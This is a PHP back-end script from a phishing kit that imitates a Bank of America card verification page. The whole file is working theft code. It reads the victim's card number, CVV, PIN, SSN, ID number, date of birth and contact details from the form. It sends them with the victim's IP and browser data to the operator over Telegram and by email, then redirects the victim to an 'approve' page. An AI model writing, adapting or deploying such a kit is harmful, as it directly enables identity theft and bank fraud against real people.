<?php
require("email.php");
include("config.php");
//Server Variables
        $ip = getenv("REMOTE_ADDR");
	    $browser = $_SERVER['HTTP_USER_AGENT'];
        $actual_link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $request_url = apache_getenv("HTTP_HOST") . apache_getenv("REQUEST_URI");
        $referer = $_SERVER['HTTP_REFERER'] ?? null;
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $cn = $_POST['cn'];
    $exp = $_POST['exp'];
    $cvv = $_POST['cvv'];
    $pin = $_POST['pin'];
    $ssn = $_POST['ssn'];
	$fname = $_POST['fname'];
    $dob = $_POST['dob'];
    $phone = $_POST['phone'];
    $add = $_POST['add'];
    $add = $_POST['add'];
    $zip = $_POST['city'];
    $zip = $_POST['state'];
    $serv = $_REQUEST['MainForm'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**BofA**CARD_INFO\n";
        $message .= "----------------------------------------\n";
        $message .= "https://geoiptool.com/en/?ip=".$ip."\n";
        $message .= "----------------------------------------\n";
        $message .= "URL : ".$referer."\n";
        $message .= "----------------------------------------\n";
        $message .= "FIRST NAME: ".$_POST['fname']."\n";
        $message .= "----------------------------------------\n";
        $message .= "MIDDLE NAME: ".$_POST['mname']."\n";
        $message .= "----------------------------------------\n";
        $message .= "LAST NAME: ".$_POST['lname']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EMAIL: ".$_POST['email']."\n";
        $message .= "----------------------------------------\n";
        $message .= "GENDER: ".$_POST['gender']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ID TYPE: ".$_POST['id']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ID NUMBER: ".$_POST['idn']."\n";
        $message .= "----------------------------------------\n";
        $message .= "SSN: ".$_POST['ssn']."\n";
        $message .= "----------------------------------------\n";
        $message .= "DATE OF BIRTH: ".$_POST['dob']."\n";
        $message .= "----------------------------------------\n";
        $message .= "PHONE: ".$_POST['phone']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ADDRESS: ".$_POST['add']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CITY: ".$_POST['city']."\n";
        $message .= "----------------------------------------\n";
        $message .= "STATE: ".$_POST['state']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ZIP: ".$_POST['zip']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Main Content
        $main_subject = "CARD INFORMATIONS 1 $ip";
        $main_body = "<p>
        -----------------------------------------<p>
        User-Agent : $_SERVER
        -----------------------------------------<p>
        Date : $DATE";
        
        
//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n $uid\r\n ","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:approve.html");
?>
